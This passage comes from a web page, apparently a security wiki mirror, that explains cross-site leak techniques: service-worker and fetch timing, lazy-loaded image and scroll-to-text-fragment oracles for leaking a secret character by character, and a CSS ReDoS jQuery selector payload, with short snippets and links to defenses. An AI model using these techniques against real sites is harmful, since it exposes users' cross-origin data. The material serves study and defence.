the new window begins to load, the attacker navigates the reference obtained in the previous step to a page managed by the <strong>service worker</strong>.</p> <p>Upon arrival of the request initiated in the preceding step, the <strong>service worker</strong> responds with a <strong>204 (No Content)</strong> status code, effectively terminating the navigation process. At this point, the <strong>service worker</strong> captures a measurement from the timer initiated earlier in step two. This measurement is influenced by the duration of JavaScript causing delays in the navigation process.</p> <blockquote> <p>[!WARNING] In an execution timing it’s possible to <strong>eliminate</strong> <strong>network factors</strong> to obtain <strong>more precise measurements</strong>. For example, by loading the resources used by the page before loading it.</p> </blockquote> <h3 id="fetch-timing">Fetch Timing</h3> <ul> <li> <strong>Inclusion Methods</strong>: Fetch API</li> <li> <strong>Detectable Difference</strong>: Timing (generally due to Page Content, Status Code)</li> <li> <strong>More info</strong>: <a href="https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#modern-web-timing-attacks" rel="external nofollow noopener" target="_blank">https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#modern-web-timing-attacks</a> </li> <li> <strong>Summary:</strong> Use <a href="https://xsleaks.dev/docs/attacks/timing-attacks/clocks/#performancenow" rel="external nofollow noopener" target="_blank">performance.now()</a> to measure the time it takes to perform a request. Other clocks could be used.</li> <li> <strong>Code Example</strong>: <a href="https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#modern-web-timing-attacks" rel="external nofollow noopener" target="_blank">https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#modern-web-timing-attacks</a> </li> </ul> <h3 id="cross-window-timing">Cross-Window Timing</h3> <ul> <li> <strong>Inclusion Methods</strong>: Pop-ups</li> <li> <strong>Detectable Difference</strong>: Timing (generally due to Page Content, Status Code)</li> <li> <strong>More info</strong>: <a href="https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#cross-window-timing-attacks" rel="external nofollow noopener" target="_blank">https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#cross-window-timing-attacks</a> </li> <li> <strong>Summary:</strong> se <a href="https://xsleaks.dev/docs/attacks/timing-attacks/clocks/#performancenow" rel="external nofollow noopener" target="_blank">performance.now()</a> to measure the time it takes to perform a request using <code class="language-plaintext highlighter-rouge">window.open</code>. Other clocks could be used.</li> <li> <strong>Code Example</strong>: <a href="https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#cross-window-timing-attacks" rel="external nofollow noopener" target="_blank">https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#cross-window-timing-attacks</a> </li> </ul> <h2 id="with-html-or-re-injection">With HTML or Re Injection</h2> <p>Here you can find techniques to exfiltrate information from a cross-origin HTML <strong>injecting HTML content</strong>. These techniques are interesting in cases where for any reason you can <strong>inject HTML but you cannot inject JS code</strong>.</p> <h3 id="dangling-markup">Dangling Markup</h3> <p>dangling-markup-html-scriptless-injection/</p> <h3 id="image-lazy-loading">Image Lazy Loading</h3> <p>If you need to <strong>exfiltrate content</strong> and you can <strong>add HTML previous to the secret</strong> you should check the <strong>common dangling markup techniques</strong>.<br> However, if for whatever reason you <strong>MUST</strong> do it <strong>char by char</strong> (maybe the communication is via a cache hit) you can use this trick.</p> <p><strong>Images</strong> in HTML has a “<strong>loading</strong>” attribute whose value can be “<strong>lazy</strong>”. In that case, the image will be loaded when it’s viewed and not while the page is loading:</p> <div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;img</span> <span class="na">src=</span><span class="s">/something</span> <span class="na">loading=</span><span class="s">lazy</span> <span class="nt">&gt;</span>
</code></pre></div></div> <p>Therefore, what you can do is to <strong>add a lot of junk chars</strong> (For example <strong>thousands of “W”s</strong>) to <strong>fill the web page before the secret or add something like</strong> <code class="language-plaintext highlighter-rouge">&lt;br&gt;&lt;canvas height="1850px"&gt;&lt;/canvas&gt;&lt;br&gt;.</code><br> Then if for example our <strong>injection appear before the flag</strong>, the <strong>image</strong> would be <strong>loaded</strong>, but if appears <strong>after</strong> the <strong>flag</strong>, the flag + the junk will <strong>prevent it from being loaded</strong> (you will need to play with how much junk to place). This is what happened in <a href="https://blog.huli.tw/2022/10/08/en/sekaictf2022-safelist-and-connection/" rel="external nofollow noopener" target="_blank"><strong>this writeup</strong></a>.</p> <p>Another option would be to use the <strong>scroll-to-text-fragment</strong> if allowed:</p> <h4 id="scroll-to-text-fragment">Scroll-to-text-fragment</h4> <p>However, you make the <strong>bot access the page</strong> with something like</p> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#:~:text=SECR
</code></pre></div></div> <p>So the web page will be something like: <strong><code class="language-plaintext highlighter-rouge">https://victim.com/post.html#:~:text=SECR</code></strong></p> <p>Where post.html contains the attacker junk chars and lazy load image and then the secret of the bot is added.</p> <p>What this text will do is to make the bot access any text in the page that contains the text <code class="language-plaintext highlighter-rouge">SECR</code>. As that text is the secret and it’s just <strong>below the image</strong>, the <strong>image will only load if the guessed secret is correct</strong>. So there you have your oracle to <strong>exfiltrate the secret char by char</strong>.</p> <p>Some code example to exploit this: <a href="https://gist.github.com/jorgectf/993d02bdadb5313f48cf1dc92a7af87e" rel="external nofollow noopener" target="_blank">https://gist.github.com/jorgectf/993d02bdadb5313f48cf1dc92a7af87e</a></p> <h3 id="image-lazy-loading-time-based">Image Lazy Loading Time Based</h3> <p>If it’s <strong>not possible to load an external image</strong> that could indicate the attacker that the image was loaded, another option would be to try to <strong>guess the char several times and measure that</strong>. If the image is loaded all the requests would take longer that if the image isn’t loaded. This is what was used in the <a href="https://blog.huli.tw/2022/10/08/en/sekaictf2022-safelist-and-connection/" rel="external nofollow noopener" target="_blank"><strong>solution of this writeup</strong></a> <strong>sumarized here:</strong></p> <p>xs-search/event-loop-blocking-+-lazy-images.md</p> <h3 id="redos">ReDoS</h3> <p>regular-expression-denial-of-service-redos.md</p> <h3 id="css-redos">CSS ReDoS</h3> <p>If <code class="language-plaintext highlighter-rouge">jQuery(location.hash)</code> is used, it’s possible to find out via timing i<strong>f some HTML content exists</strong>, this is because if the selector <code class="language-plaintext highlighter-rouge">main[id='site-main']</code> doesn’t match it doesn’t need to check the rest of the <strong>selectors</strong>:</p> <div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">$</span><span class="p">(</span><span class="dl">"</span><span class="s2">*:has(*:has(*:has(*)) *:has(*:has(*:has(*))) *:has(*:has(*:has(*)))) main[id='site-main']</span><span class="dl">"</span><span class="p">);</span>
</code></pre></div></div> <h3 id="css-injection">CSS Injection</h3> <p>xs-search/css-injection/</p> <h2 id="defenses">Defenses</h2> <p>There are mitigations recommended in <a href="https://xsinator.com/paper.pdf" rel="external nofollow noopener" target="_blank">https://xsinator.com/paper.pdf</a> also in each section of the wiki <a href="https://xsleaks.dev/" rel="external nofollow noopener" target="_blank">https://xsleaks.dev/</a>. Take a look there for more information about how to protect against these techniques.</p> <h2 id="references">References</h2> <ul> <li><a href="https://xsinator.com/paper.pdf" rel="external nofollow noopener" target="_blank">https://xsinator.com/paper.pdf</a></li> <li><a href="https://xsleaks.dev" rel="external nofollow noopener" target="_blank">https://xsleaks.dev/</a></li> <li><a href="https://github.com/xsleaks/xsleaks" rel="external nofollow noopener" target="_blank">https://github.com/xsleaks/xsleaks</a></li> <li><a href="https://xsinator.com/" rel="external nofollow noopener" target="_blank">https://xsinator.com/</a></li> <li><a href="https://github.com/ka0labs/ctf-writeups/tree/master/2019/nn9ed/x-oracle" rel="external nofollow noopener" target="_blank">https://github.com/ka0labs/ctf-writeups/tree/master/2019/nn9ed/x-oracle</a></li> </ul> </article> </div> </div> </div> </div> <footer class="sticky-bottom mt-5" role="contentinfo"> <div class="container"> © Copyright 2025 47z!Lu7h . Love is life. And if you miss love, you miss life. </div> </footer> <script src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js" integrity="sha256-/xUj+3OJU5yExlq6GSYGSHk7tPXikynS7ogEvDej/m4=" crossorigin="anonymous"></script> <script src="/assets/js/bootstrap.bundle.min.js"></script> <script src="https://cdn.jsdelivr.net/npm/mdbootstrap@4.20.0/js/mdb.min.js" integrity="sha256-NdbiivsvWt7VYCt6hYNT3h/th9vSTL4EDWeGs5SN3DA=" crossorigin="anonymous"></script> <script defer src="https://cdn.jsdelivr.net/npm/masonry-layout@4.2.2/dist/masonry.pkgd.min.js" integrity="sha256-Nn1q/fx0H7SNLZMQ5Hw5JLaTRZp0yILA/FRexe19VdI=" crossorigin="anonymous"></script> <script defer src="https://cdn.jsdelivr.net/npm/imagesloaded@4/imagesloaded.pkgd.min.js"></script> <script defer src="/assets/js/masonry.js" type="text/javascript"></script> <script defer src="https://cdn.jsdelivr.net/npm/medium-zoom@1.1.0/dist/medium-zoom.min.js" integrity="sha256-ZgMyDAIYDYGxbcpJcfUnYwNevG/xi9OHKaR/8GK+jWc=" crossorigin="anonymous"></script> <script defer src="/assets/js/zoom.js?85ddb88934d28b74e78031fd54cf8308"></script> <script defer src="/assets/js/bootstrap-toc.min.js?c82ff4de8b0955d6ff14f5b05eed7eb6"></script> <script src="/assets/js/no_defer.js?2930004b8d7fcd0a8e00fdcfc8fc9f24"></script> <script defer src="/assets/js/common.js?4a129fbf39254905f505c7246e641eaf"></script> <script defer src="/assets/js/copy_code.js?12775fdf7f95e901d7119054556e495f" type="text/javascript"></script> <script async src="https://d1bxh8uas1mnw7.cloudfront.net/assets/embed.js"></script> <script async src="https://badge.dimensions.ai/badge.js"></script> <script type="text/javascript">window.MathJax={tex:{tags:"ams"}};</script> <script defer type="text/javascript" id="MathJax-script" src="https://cdn.jsdelivr.net/npm/mathjax@3.2.0/es5/tex-mml-chtml.js"></script> <script defer src="https://polyfill.io/v3/polyfill.min.js?features=es6"></script> <script type="text/javascript">function progressBarSetup(){"max"in document.createElement("progress")?(initializeProgressElement(),$(document).on("scroll",function(){progressBar.attr({value:getCurrentScrollPosition()})}),$(window).on("resize",initializeProgressElement)):(resizeProgressBar(),$(document).on("scroll",resizeProgressBar),$(window).on("resize",resizeProgressBar))}function getCurrentScrollPosition(){return $(window).scrollTop()}function initializeProgressElement(){let e=$("#navbar").outerHeight(!0);$("body").css({"padding-top":e}),$("progress-container").css({"padding-top":e}),progressBar.css({top:e}),progressBar.attr({max:getDistanceToScroll(),value:getCurrentScrollPosition()})}function getDistanceToScroll(){return $(document).height()-$(window).height()}function resizeProgressBar(){progressBar.css({width:getWidthPercentage()+"%"})}function getWidthPercentage(){return getCurrentScrollPosition()/getDistanceToScroll()*100}const progressBar=$("#progress");window.onload=function(){setTimeout(progressBarSetup,50)};</script> </body> </html>